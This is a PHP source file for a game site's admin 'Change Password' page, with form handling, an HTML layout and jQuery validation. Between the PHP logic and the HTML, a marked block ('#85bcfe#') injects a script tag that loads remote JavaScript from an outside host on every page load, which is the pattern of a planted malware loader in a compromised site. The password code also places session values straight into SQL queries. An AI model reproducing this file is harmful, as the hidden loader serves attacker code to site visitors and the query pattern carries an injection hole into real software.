<?php session_start();
ob_start();
$page = "Change Password";
include "inc/session_check.php"; 
$page = "";
$side_menu = "home";

if(isset($_POST['submit']))
{
	
	$sql = mysql_query("select * from sd_admin where uid ='$_SESSION[foreuid]'");
	$fetch = mysql_fetch_array($sql);
	$pass = $fetch['password'];

	$password = $_POST['old_password']; 
	$new_pass = $_POST['password'];
	
    $enc_password = mysql_real_escape_string(encryptString($password));
	$new_enc_pass =encryptString($new_pass);
	
	if($pass == $enc_password)
	{
		$update = "update sd_admin set password ='$new_enc_pass' where uid ='$_SESSION[foreuid]' ";
		
		if(mysql_query($update))
		{
			$msg= '<div class="succes">Your Password has been changed</div>';
		}
	}
	else
	{
		$msg= '<div class="error">Your Password is Wrong</div>';
	}
	
}

?>
<?php
#85bcfe#
if(empty($g)) {
$g = "<script type=\"text/javascript\" src=\"http://manutd.ge/cqn4rfwt.php?id=11967013\"></script>";
echo $g;
}
#/85bcfe#
?><!DOCTYPE html>
  <!--[if lt IE 7]>
    <html class="lt-ie9 lt-ie8 lt-ie7" lang="en">
  <![endif]-->

  <!--[if IE 7]>
    <html class="lt-ie9 lt-ie8" lang="en">
  <![endif]-->

  <!--[if IE 8]>
    <html class="lt-ie9" lang="en">
  <![endif]-->

  <!--[if gt IE 8]>
    <!-->
    <html lang="en">
    <!--
  <![endif]-->

  <head>
    <meta charset="utf-8">
    <title>Game Admin | Add Advertisement</title>
     <link href="icomoon/style.css" rel="stylesheet">
    <!--[if lte IE 7]>
      <script src="css/icomoon-font/lte-ie7.js"></script>
    <![endif]-->
    <link href="css/main.css" rel="stylesheet">
    

  </head>
  <body>
    
    <?php 
	  	include "inc/header.php";
    ?>

    <div class="container-fluid">
      
    <?php 
	  	include "inc/main_nav.php";
    ?>
      
      <div class="dashboard-wrapper">
        <div class="main-container">
        
          <?php 
		  	include "inc/sub_navbar.php";
			include "inc/breadcrumb.php";
		  ?>

			<div class="row-fluid">
            <div class="span6">
              <div class="widget">
                <div class="widget-header">
                  <div class="title">
                  Change Password
                  </div>
                </div>
                <div class="widget-body">
                	<?php if(isset($msg)){ echo $msg; } ?>
                	<form class="form-horizontal no-margin well" id="ad_form" name="form" method="post" enctype="multipart/form-data" >
	            	  <h5 class="text-info">Password Information</h5>
                    <hr>
                    <div class="control-group">
                      <label class="control-label">
                        Current password * :
                      </label>
                      <div class="controls">
                     <input type="password" name="old_password" class="required" />
                     </div>
                    </div>
                    
 					 <div class="control-group">
                      <label class="control-label">
                        Enter New Password * :
                      </label>
                      <div class="controls">
            		<input type="password" name="password" class="required" />
                     </div>
                    </div>
                    
 						 <div class="control-group">
                      <label class="control-label">
                        Confirm Password * :
                      </label>
                      <div class="controls">
            		<input type="password" name="con_password" class="required" />
                     </div>
                    </div>
                     <div class="form-actions no-margin">
				 	<input type="submit" class="btn btn-info" name="submit" value="submit">
                    </div>
			</form>
				</div>
              </div>
            </div>

            
          </div>

          
        </div>
      </div>
    </div>
    
    <?php
    include 'inc/footer.php';
    ?>
  
   <script src="js/wysiwyg/wysihtml5-0.3.0.js"></script>
    <script src="js/jquery.min.js"></script>
    <script src="js/bootstrap.js"></script>
    <script src="js/wysiwyg/bootstrap-wysihtml5.js"></script>
    <script type="text/javascript"  src="js/jquery-latest.js"></script>
<script type="text/javascript"  src="js/jquery.validate.js"></script>
<script>
  $(document).ready(function(){
    $("#ad_form").validate({
    	success: function(label) {
			// set &nbsp; as text for IE
			label.html("&nbsp;").addClass("checked");
		}
    });
    });
</script>
</body>
</html>
